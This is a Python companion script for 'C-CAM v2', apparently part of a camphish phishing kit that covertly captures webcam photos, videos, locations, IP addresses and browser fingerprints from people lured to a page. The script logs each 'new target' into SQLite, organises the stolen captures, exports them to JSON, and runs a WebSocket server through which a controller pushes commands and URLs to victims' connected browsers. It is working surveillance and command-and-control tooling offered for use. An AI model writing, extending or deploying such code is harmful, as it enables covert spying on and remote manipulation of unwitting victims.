#!/usr/bin/env python3
"""
C-CAM v2 — Python Companion Script
Auto-downloads captured images and provides SQLite storage + WebSocket updates.
Use alongside camphish.sh or as standalone.

Usage:
    python3 camphish.py --watch           # Watch directory and auto-save to DB
    python3 camphish.py --download        # Download/organize all captured files  
    python3 camphish.py --websocket       # Start WebSocket server for real-time
    python3 camphish.py --export          # Export data from SQLite DB
"""

import os
import sys
import json
import time
import glob
import shutil
import sqlite3
import argparse
import threading
from datetime import datetime
from pathlib import Path

try:
    import asyncio
    import websockets
    HAS_WEBSOCKET = True
except ImportError:
    HAS_WEBSOCKET = False

# Paths
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(BASE_DIR, 'c-cam.db')
DOWNLOAD_DIR = os.path.join(BASE_DIR, 'downloads')

# Colors
class Color:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

def banner():
    print(f"""
{Color.GREEN}╔══════════════════════════════════════════╗
║      ⚡ C-CAM v2 — Python Tools          ║
║      SQLite + WebSocket + Auto-Download   ║
╚══════════════════════════════════════════╝{Color.RESET}
    """)

# ========== SQLite Database ==========

def init_db():
    """Initialize SQLite database with all tables."""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ip TEXT,
        user_agent TEXT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS photos (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        filename TEXT,
        session_id INTEGER,
        filesize INTEGER,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (session_id) REFERENCES sessions(id)
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS locations (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        latitude REAL,
        longitude REAL,
        accuracy REAL,
        source TEXT,
        session_id INTEGER,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (session_id) REFERENCES sessions(id)
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS fingerprints (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        data TEXT,
        session_id INTEGER,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (session_id) REFERENCES sessions(id)
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS videos (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        filename TEXT,
        filesize INTEGER,
        session_id INTEGER,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (session_id) REFERENCES sessions(id)
    )''')
    
    conn.commit()
    conn.close()
    print(f"{Color.GREEN}[*] Database initialized: {DB_PATH}{Color.RESET}")

def save_to_db(table, data):
    """Save data to SQLite database."""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    columns = ', '.join(data.keys())
    placeholders = ', '.join(['?' for _ in data])
    values = tuple(data.values())
    
    c.execute(f'INSERT INTO {table} ({columns}) VALUES ({placeholders})', values)
    conn.commit()
    last_id = c.lastrowid
    conn.close()
    return last_id

# ========== Auto-Download & Watch ==========

def auto_download():
    """Organize and download all captured files into structured directories."""
    os.makedirs(DOWNLOAD_DIR, exist_ok=True)
    
    dirs = {
        'photos': os.path.join(DOWNLOAD_DIR, 'photos'),
        'videos': os.path.join(DOWNLOAD_DIR, 'videos'),
        'locations': os.path.join(DOWNLOAD_DIR, 'locations'),
        'fingerprints': os.path.join(DOWNLOAD_DIR, 'fingerprints'),
        'logs': os.path.join(DOWNLOAD_DIR, 'logs'),
    }
    
    for d in dirs.values():
        os.makedirs(d, exist_ok=True)
    
    # Copy photos
    photos = glob.glob(os.path.join(BASE_DIR, 'cam*.png'))
    for p in photos:
        dest = os.path.join(dirs['photos'], os.path.basename(p))
        if not os.path.exists(dest):
            shutil.copy2(p, dest)
            print(f"{Color.YELLOW}[📸] Saved: {os.path.basename(p)}{Color.RESET}")
            save_to_db('photos', {'filename': os.path.basename(p), 'filesize': os.path.getsize(p)})
    
    # Copy videos
    videos = glob.glob(os.path.join(BASE_DIR, 'video_*.webm'))
    for v in videos:
        dest = os.path.join(dirs['videos'], os.path.basename(v))
        if not os.path.exists(dest):
            shutil.copy2(v, dest)
            print(f"{Color.MAGENTA}[🎥] Saved: {os.path.basename(v)}{Color.RESET}")
            save_to_db('videos', {'filename': os.path.basename(v), 'filesize': os.path.getsize(v)})
    
    # Copy locations
    locations = glob.glob(os.path.join(BASE_DIR, 'saved_locations', '*.txt'))
    for l in locations:
        dest = os.path.join(dirs['locations'], os.path.basename(l))
        if not os.path.exists(dest):
            shutil.copy2(l, dest)
            print(f"{Color.CYAN}[📍] Saved: {os.path.basename(l)}{Color.RESET}")
    
    # Copy fingerprints
    fps = glob.glob(os.path.join(BASE_DIR, 'saved_fingerprints', '*.txt'))
    for f in fps:
        dest = os.path.join(dirs['fingerprints'], os.path.basename(f))
        if not os.path.exists(dest):
            shutil.copy2(f, dest)
            print(f"{Color.GREEN}[🔍] Saved: {os.path.basename(f)}{Color.RESET}")
    
    # Copy IP logs
    ip_file = os.path.join(BASE_DIR, 'saved.ip.txt')
    if os.path.exists(ip_file):
        shutil.copy2(ip_file, os.path.join(dirs['logs'], 'ips.txt'))
    
    print(f"\n{Color.GREEN}[*] All files organized in: {DOWNLOAD_DIR}{Color.RESET}")
    print(f"    📸 Photos: {len(photos)}")
    print(f"    🎥 Videos: {len(videos)}")
    print(f"    📍 Locations: {len(locations)}")
    print(f"    🔍 Fingerprints: {len(fps)}")

def watch_directory():
    """Watch for new captured files and auto-save to database."""
    init_db()
    print(f"{Color.CYAN}[*] Watching for new captures... (Ctrl+C to stop){Color.RESET}")
    
    seen_files = set()
    
    while True:
        # Check for new photos
        for f in glob.glob(os.path.join(BASE_DIR, 'cam*.png')):
            if f not in seen_files:
                seen_files.add(f)
                print(f"{Color.YELLOW}[📸] New photo: {os.path.basename(f)}{Color.RESET}")
                save_to_db('photos', {'filename': os.path.basename(f), 'filesize': os.path.getsize(f)})
                # Auto-copy to downloads
                os.makedirs(os.path.join(DOWNLOAD_DIR, 'photos'), exist_ok=True)
                shutil.copy2(f, os.path.join(DOWNLOAD_DIR, 'photos', os.path.basename(f)))
        
        # Check for new videos
        for f in glob.glob(os.path.join(BASE_DIR, 'video_*.webm')):
            if f not in seen_files:
                seen_files.add(f)
                print(f"{Color.MAGENTA}[🎥] New video: {os.path.basename(f)}{Color.RESET}")
                save_to_db('videos', {'filename': os.path.basename(f), 'filesize': os.path.getsize(f)})
                os.makedirs(os.path.join(DOWNLOAD_DIR, 'videos'), exist_ok=True)
                shutil.copy2(f, os.path.join(DOWNLOAD_DIR, 'videos', os.path.basename(f)))
        
        # Check for new IP
        ip_file = os.path.join(BASE_DIR, 'ip.txt')
        if os.path.exists(ip_file) and ip_file not in seen_files:
            seen_files.add(ip_file)
            with open(ip_file, 'r') as f:
                ip_data = f.read().strip()
            print(f"{Color.RED}[🎯] New target: {ip_data[:50]}{Color.RESET}")
            save_to_db('sessions', {'ip': ip_data, 'user_agent': ''})
        
        # Check for fingerprints
        fp_file = os.path.join(BASE_DIR, 'current_fingerprint.txt')
        if os.path.exists(fp_file):
            with open(fp_file, 'r') as f:
                fp_data = f.read()
            print(f"{Color.GREEN}[🔍] New fingerprint captured{Color.RESET}")
            save_to_db('fingerprints', {'data': fp_data})
        
        time.sleep(2)

# ========== WebSocket Server ==========

# Global trackers for Two-Way setups
controllers = set()
targets = {}

async def ws_handler(websocket, path=None):
    """Handle WebSocket connections for real-time updates and control."""
    print(f"{Color.CYAN}[WS] New connection attempt...{Color.RESET}")
    client_id = None
    client_type = None

    try:
        # 1. Identity Handshake check
        handshake = await websocket.recv()
        data = json.loads(handshake)
        client_type = data.get("type", "dashboard")
        
        if client_type == "dashboard":
            controllers.add(websocket)
            print(f"{Color.GREEN}[WS] Controller added.{Color.RESET}")
        elif client_type == "target":
            client_id = data.get("id", "unknown")
            targets[client_id] = websocket
            print(f"{Color.MAGENTA}[WS] Target connected: {client_id}{Color.RESET}")
            # Notify controllers
            for c in controllers:
                try: await c.send(json.dumps({"target_online": client_id}))
                except: pass

        # 2. Setup Concurrency (Read and Write)
        async def read_loop():
            try:
                while True:
                    msg = await websocket.recv()
                    parsed = json.loads(msg)
                    cmd = parsed.get("cmd")
                    
                    if client_type == "dashboard":
                        target_id = parsed.get("id")
                        if target_id in targets:
                            print(f"{Color.YELLOW}[WS] Pushing command '{cmd}' to {target_id}{Color.RESET}")
                            target_ws = targets[target_id]
                            await target_ws.send(json.dumps({"cmd": cmd, "url": parsed.get("url", "")}))
                        else:
                            print(f"{Color.RED}[WS] Target {target_id} not connected.{Color.RESET}")
            except: pass

        async def write_loop():
            seen = set()
            try:
                while True:
                    if client_type == "dashboard":
                        updates = {}
                        photos = glob.glob(os.path.join(BASE_DIR, 'cam*.png'))
                        new_photos = [os.path.basename(p) for p in photos if p not in seen]
                        if new_photos:
                            updates['photos'] = new_photos
                            seen.update(photos)

                        ip_file = os.path.join(BASE_DIR, 'ip.txt')
                        if os.path.exists(ip_file) and ip_file not in seen:
                            seen.add(ip_file)
                            with open(ip_file) as f: updates['target'] = f.read().strip()

                        loc_file = os.path.join(BASE_DIR, 'current_location.txt')
                        if os.path.exists(loc_file) and loc_file + str(os.path.getmtime(loc_file)) not in seen:
                            seen.add(loc_file + str(os.path.getmtime(loc_file)))
                            with open(loc_file) as f: updates['location'] = f.read().strip()

                        if updates:
                            await websocket.send(json.dumps(updates))

                    await asyncio.sleep(2)
            except: pass

        await asyncio.gather(read_loop(), write_loop())

    except Exception as e:
        print(f"{Color.YELLOW}[WS] Closed: {client_type} ({client_id if client_id else 'dashboard'}){Color.RESET}")
    finally:
        if websocket in controllers: controllers.remove(websocket)
        if client_id in targets: del targets[client_id]

def start_websocket():
    """Start WebSocket server for real-time updates."""
    if not HAS_WEBSOCKET:
        print(f"{Color.RED}[!] websockets library not installed. Run: pip install websockets{Color.RESET}")
        return
    
    print(f"{Color.GREEN}[*] WebSocket server starting on ws://127.0.0.1:8765{Color.RESET}")
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    server = websockets.serve(ws_handler, '127.0.0.1', 8765)
    loop.run_until_complete(server)
    loop.run_forever()

# ========== Export ==========

def export_data():
    """Export all data from SQLite database."""
    if not os.path.exists(DB_PATH):
        print(f"{Color.RED}[!] No database found. Run --watch first.{Color.RESET}")
        return
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    export = {}
    
    for table in ['sessions', 'photos', 'locations', 'fingerprints', 'videos']:
        c.execute(f'SELECT * FROM {table}')
        columns = [description[0] for description in c.description]
        rows = [dict(zip(columns, row)) for row in c.fetchall()]
        export[table] = rows
        print(f"{Color.GREEN}[*] {table}: {len(rows)} records{Color.RESET}")
    
    conn.close()
    
    export_file = os.path.join(BASE_DIR, 'c-cam_export.json')
    with open(export_file, 'w') as f:
        json.dump(export, f, indent=2, default=str)
    
    print(f"\n{Color.GREEN}[*] Data exported to: {export_file}{Color.RESET}")

# ========== Main ==========

def main():
    banner()
    
    parser = argparse.ArgumentParser(description='C-CAM v2 Python Tools')
    parser.add_argument('--watch', action='store_true', help='Watch and auto-save captures to DB')
    parser.add_argument('--download', action='store_true', help='Download/organize all captured files')
    parser.add_argument('--websocket', action='store_true', help='Start WebSocket server')
    parser.add_argument('--export', action='store_true', help='Export database to JSON')
    parser.add_argument('--all', action='store_true', help='Run watch + websocket together')
    
    args = parser.parse_args()
    
    if args.download:
        init_db()
        auto_download()
    elif args.watch:
        watch_directory()
    elif args.websocket:
        start_websocket()
    elif args.export:
        export_data()
    elif args.all:
        init_db()
        # Start WebSocket in background thread
        if HAS_WEBSOCKET:
            ws_thread = threading.Thread(target=start_websocket, daemon=True)
            ws_thread.start()
            print(f"{Color.GREEN}[*] WebSocket server started in background{Color.RESET}")
        watch_directory()
    else:
        parser.print_help()

if __name__ == '__main__':
    main()
